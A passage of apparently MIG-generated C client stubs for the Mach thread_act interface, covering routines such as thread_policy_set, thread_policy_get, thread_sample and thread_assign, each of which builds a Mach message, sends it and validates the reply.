		policy_t policy;
		mach_msg_type_number_t baseCnt;
		integer_t base[5];
		boolean_t set_limit;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;
	unsigned int msgh_size_delta;


#ifdef	__MIG_check__Reply__thread_policy_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__thread_policy_t__defined */

	__DeclareSendRpc(3616, "thread_policy")

	InP->NDR = NDR_record;

	InP->policy = policy;

	if (baseCnt > 5) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->base, (const char *) base, 4 * baseCnt);

	InP->baseCnt = baseCnt;

	msgh_size_delta = (4 * baseCnt);
	msgh_size = (mach_msg_size_t)(sizeof(Request) - 20) + msgh_size_delta;
	InP = (Request *) ((pointer_t) InP + msgh_size_delta - 20);

	InP->set_limit = set_limit;

	InP = &Mess.In;
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = thr_act;
	InP->Head.msgh_id = 3616;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3616, "thread_policy")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3616, "thread_policy")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__thread_policy_t__defined)
	check_result = __MIG_check__Reply__thread_policy_t((__Reply__thread_policy_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__thread_policy_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__thread_policy_set_t__defined)
#define __MIG_check__Reply__thread_policy_set_t__defined

mig_internal kern_return_t __MIG_check__Reply__thread_policy_set_t(__Reply__thread_policy_set_t *Out0P)
{

	typedef __Reply__thread_policy_set_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3717) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__thread_policy_set_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine thread_policy_set */
mig_external kern_return_t thread_policy_set
(
	thread_act_t thread,
	thread_policy_flavor_t flavor,
	thread_policy_t policy_info,
	mach_msg_type_number_t policy_infoCnt
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		thread_policy_flavor_t flavor;
		mach_msg_type_number_t policy_infoCnt;
		integer_t policy_info[16];
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;
	unsigned int msgh_size;

#ifdef	__MIG_check__Reply__thread_policy_set_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__thread_policy_set_t__defined */

	__DeclareSendRpc(3617, "thread_policy_set")

	InP->NDR = NDR_record;

	InP->flavor = flavor;

	if (policy_infoCnt > 16) {
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) InP->policy_info, (const char *) policy_info, 4 * policy_infoCnt);

	InP->policy_infoCnt = policy_infoCnt;

	msgh_size = (mach_msg_size_t)(sizeof(Request) - 64) + ((4 * policy_infoCnt));
	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = thread;
	InP->Head.msgh_id = 3617;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3617, "thread_policy_set")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3617, "thread_policy_set")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__thread_policy_set_t__defined)
	check_result = __MIG_check__Reply__thread_policy_set_t((__Reply__thread_policy_set_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__thread_policy_set_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__thread_policy_get_t__defined)
#define __MIG_check__Reply__thread_policy_get_t__defined

mig_internal kern_return_t __MIG_check__Reply__thread_policy_get_t(__Reply__thread_policy_get_t *Out0P, __Reply__thread_policy_get_t **Out1PP)
{

	typedef __Reply__thread_policy_get_t __Reply __attribute__((unused));
	__Reply *Out1P;
#if	__MigTypeCheck
	unsigned int msgh_size;
#endif	/* __MigTypeCheck */
	unsigned int msgh_size_delta;

	if (Out0P->Head.msgh_id != 3718) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	msgh_size = Out0P->Head.msgh_size;

	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    ((msgh_size > (mach_msg_size_t)sizeof(__Reply) || msgh_size < (mach_msg_size_t)(sizeof(__Reply) - 64)) &&
	     (msgh_size != (mach_msg_size_t)sizeof(mig_reply_error_t) ||
	      Out0P->RetCode == KERN_SUCCESS)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	if (Out0P->RetCode != KERN_SUCCESS) {
		return ((mig_reply_error_t *)Out0P)->RetCode;
	}

	msgh_size_delta = Out0P->policy_infoCnt * 4;
#if	__MigTypeCheck
	if ( Out0P->policy_infoCnt > 16 )
		return MIG_TYPE_ERROR;
	if (((msgh_size - (mach_msg_size_t)(sizeof(__Reply) - 64)) / 4< Out0P->policy_infoCnt) ||
	    (msgh_size != (mach_msg_size_t)(sizeof(__Reply) - 64) + Out0P->policy_infoCnt * 4))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

	*Out1PP = Out1P = (__Reply *) ((pointer_t) Out0P + msgh_size_delta - 64);

	return MACH_MSG_SUCCESS;
}
#endif /* !defined(__MIG_check__Reply__thread_policy_get_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine thread_policy_get */
mig_external kern_return_t thread_policy_get
(
	thread_inspect_t thread,
	thread_policy_flavor_t flavor,
	thread_policy_t policy_info,
	mach_msg_type_number_t *policy_infoCnt,
	boolean_t *get_default
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		thread_policy_flavor_t flavor;
		mach_msg_type_number_t policy_infoCnt;
		boolean_t get_default;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t policy_infoCnt;
		integer_t policy_info[16];
		boolean_t get_default;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_type_number_t policy_infoCnt;
		integer_t policy_info[16];
		boolean_t get_default;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;
	Reply *Out1P = NULL;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__thread_policy_get_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__thread_policy_get_t__defined */

	__DeclareSendRpc(3618, "thread_policy_get")

	InP->NDR = NDR_record;

	InP->flavor = flavor;

	if (*policy_infoCnt < 16)
		InP->policy_infoCnt = *policy_infoCnt;
	else
		InP->policy_infoCnt = 16;

	InP->get_default = *get_default;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = thread;
	InP->Head.msgh_id = 3618;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3618, "thread_policy_get")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3618, "thread_policy_get")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__thread_policy_get_t__defined)
	check_result = __MIG_check__Reply__thread_policy_get_t((__Reply__thread_policy_get_t *)Out0P, (__Reply__thread_policy_get_t **)&Out1P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__thread_policy_get_t__defined) */

	if (Out0P->policy_infoCnt > *policy_infoCnt) {
		(void)memcpy((char *) policy_info, (const char *) Out0P->policy_info, 4 *  *policy_infoCnt);
		*policy_infoCnt = Out0P->policy_infoCnt;
		{ return MIG_ARRAY_TOO_LARGE; }
	}
	(void)memcpy((char *) policy_info, (const char *) Out0P->policy_info, 4 * Out0P->policy_infoCnt);

	*policy_infoCnt = Out0P->policy_infoCnt;

	*get_default = Out1P->get_default;

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__thread_sample_t__defined)
#define __MIG_check__Reply__thread_sample_t__defined

mig_internal kern_return_t __MIG_check__Reply__thread_sample_t(__Reply__thread_sample_t *Out0P)
{

	typedef __Reply__thread_sample_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3719) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__thread_sample_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine thread_sample */
mig_external kern_return_t thread_sample
(
	thread_act_t thread,
	mach_port_t reply
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t reply;
		/* end of the kernel processed data */
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__thread_sample_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__thread_sample_t__defined */

	__DeclareSendRpc(3619, "thread_sample")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t replyTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		20,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->reply = replyTemplate;
	InP->reply.name = reply;
#else	/* UseStaticTemplates */
	InP->reply.name = reply;
	InP->reply.disposition = 20;
	InP->reply.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = thread;
	InP->Head.msgh_id = 3619;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3619, "thread_sample")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3619, "thread_sample")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__thread_sample_t__defined)
	check_result = __MIG_check__Reply__thread_sample_t((__Reply__thread_sample_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__thread_sample_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__etap_trace_thread_t__defined)
#define __MIG_check__Reply__etap_trace_thread_t__defined

mig_internal kern_return_t __MIG_check__Reply__etap_trace_thread_t(__Reply__etap_trace_thread_t *Out0P)
{

	typedef __Reply__etap_trace_thread_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3720) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__etap_trace_thread_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine etap_trace_thread */
mig_external kern_return_t etap_trace_thread
(
	thread_act_t target_act,
	boolean_t trace_status
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		boolean_t trace_status;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__etap_trace_thread_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__etap_trace_thread_t__defined */

	__DeclareSendRpc(3620, "etap_trace_thread")

	InP->NDR = NDR_record;

	InP->trace_status = trace_status;

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits =
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = target_act;
	InP->Head.msgh_id = 3620;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3620, "etap_trace_thread")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3620, "etap_trace_thread")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__etap_trace_thread_t__defined)
	check_result = __MIG_check__Reply__etap_trace_thread_t((__Reply__etap_trace_thread_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__etap_trace_thread_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__thread_assign_t__defined)
#define __MIG_check__Reply__thread_assign_t__defined

mig_internal kern_return_t __MIG_check__Reply__thread_assign_t(__Reply__thread_assign_t *Out0P)
{

	typedef __Reply__thread_assign_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3721) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__thread_assign_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine thread_assign */
mig_external kern_return_t thread_assign
(
	thread_act_t thread,
	processor_set_t new_set
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		/* start of the kernel processed data */
		mach_msg_body_t msgh_body;
		mach_msg_port_descriptor_t new_set;
		/* end of the kernel processed data */
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
	} __Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif
	/*
	 * typedef struct {
	 * 	mach_msg_header_t Head;
	 * 	NDR_record_t NDR;
	 * 	kern_return_t RetCode;
	 * } mig_reply_error_t;
	 */

	union {
		Request In;
		Reply Out;
	} Mess;

	Request *InP = &Mess.In;
	Reply *Out0P = &Mess.Out;

	mach_msg_return_t msg_result;

#ifdef	__MIG_check__Reply__thread_assign_t__defined
	kern_return_t check_result;
#endif	/* __MIG_check__Reply__thread_assign_t__defined */

	__DeclareSendRpc(3621, "thread_assign")

#if	UseStaticTemplates
	const static mach_msg_port_descriptor_t new_setTemplate = {
		/* name = */		MACH_PORT_NULL,
		/* pad1 = */		0,
		/* pad2 = */		0,
		/* disp = */		19,
		/* type = */		MACH_MSG_PORT_DESCRIPTOR,
	};
#endif	/* UseStaticTemplates */

	InP->msgh_body.msgh_descriptor_count = 1;
#if	UseStaticTemplates
	InP->new_set = new_setTemplate;
	InP->new_set.name = new_set;
#else	/* UseStaticTemplates */
	InP->new_set.name = new_set;
	InP->new_set.disposition = 19;
	InP->new_set.type = MACH_MSG_PORT_DESCRIPTOR;
#endif	/* UseStaticTemplates */

	InP->Head.msgh_reply_port = mig_get_reply_port();
	InP->Head.msgh_bits = MACH_MSGH_BITS_COMPLEX|
		MACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);
	/* msgh_size passed as argument */
	InP->Head.msgh_request_port = thread;
	InP->Head.msgh_id = 3621;
	InP->Head.msgh_reserved = 0;
	
/* BEGIN VOUCHER CODE */

#ifdef USING_VOUCHERS
	if (voucher_mach_msg_set != NULL) {
		voucher_mach_msg_set(&InP->Head);
	}
#endif // USING_VOUCHERS
	
/* END VOUCHER CODE */

	__BeforeSendRpc(3621, "thread_assign")
	msg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
	__AfterSendRpc(3621, "thread_assign")
	if (msg_result != MACH_MSG_SUCCESS) {
		__MachMsgErrorWithoutTimeout(msg_result);
	}
	if (msg_result != MACH_MSG_SUCCESS) {
		{ return msg_result; }
	}


#if	defined(__MIG_check__Reply__thread_assign_t__defined)
	check_result = __MIG_check__Reply__thread_assign_t((__Reply__thread_assign_t *)Out0P);
	if (check_result != MACH_MSG_SUCCESS) {
		mach_msg_destroy(&Out0P->Head);
		{ return check_result; }
	}
#endif	/* defined(__MIG_check__Reply__thread_assign_t__defined) */

	return KERN_SUCCESS;
}

#if ( __MigTypeCheck )
#if __MIG_check__Reply__thread_act_subsystem__
#if !defined(__MIG_check__Reply__thread_assign_default_t__defined)
#define __MIG_check__Reply__thread_assign_default_t__defined

mig_internal kern_return_t __MIG_check__Reply__thread_assign_default_t(__Reply__thread_assign_default_t *Out0P)
{

	typedef __Reply__thread_assign_default_t __Reply __attribute__((unused));
	if (Out0P->Head.msgh_id != 3722) {
	    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)
		{ return MIG_SERVER_DIED; }
	    else
		{ return MIG_REPLY_MISMATCH; }
	}

#if	__MigTypeCheck
	if ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||
	    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))
		{ return MIG_TYPE_ERROR ; }
#endif	/* __MigTypeCheck */

#if	__MigTypeCheck
	if (Out0P->Head.msgh_request_port != MACH_PORT_NULL) {
		return MIG_TYPE_ERROR;
	}
#endif	/* __MigTypeCheck */
	{
		return Out0P->RetCode;
	}
}
#endif /* !defined(__MIG_check__Reply__thread_assign_default_t__defined) */
#endif /* __MIG_check__Reply__thread_act_subsystem__ */
#endif /* ( __MigTypeCheck ) */


/* Routine thread_assign_default */
mig_external kern_return_t thread_assign_default
(
	thread_act_t thread
)
{

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
	} Request __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
		kern_return_t RetCode;
		mach_msg_trailer_t trailer;
	} Reply __attribute__((unused));
#ifdef  __MigPackStructs
#pragma pack(pop)
#endif

#ifdef  __MigPackStructs
#pragma pack(push, 4)
#endif
	typedef struct {
		mach_msg_header_t Head;
		NDR_record_t NDR;
